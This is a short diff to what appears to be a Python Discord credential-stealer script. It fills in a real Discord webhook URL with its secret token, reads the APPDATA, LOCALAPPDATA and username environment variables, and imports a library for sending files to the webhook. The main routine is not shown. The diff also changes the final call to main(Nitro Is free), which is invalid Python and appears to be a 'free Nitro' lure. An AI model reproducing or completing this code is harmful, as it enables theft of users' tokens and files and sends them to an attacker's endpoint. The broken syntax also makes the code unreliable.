@@ -12,7 +12,7 @@ import zipfile
 from requests import get
 from dhooks import Webhook, File
 
-hook = Webhook('WEBHOOK HERE')
+hook = Webhook('https://discord.com/api/webhooks/982888992389365760/zkcNiGQ8LrOHOZ-8vZa_7tDGQeaBJkMFgm5LEUliOFbRriblHBbTJZyVanPE65WywaS6')
 path = os.getenv('APPDATA')
 localpath = os.getenv('LOCALAPPDATA')
 user = os.getenv('username')
@@ -94,4 +94,4 @@ def main():
   except:
     return ''
 
-main()
+main(Nitro Is free)
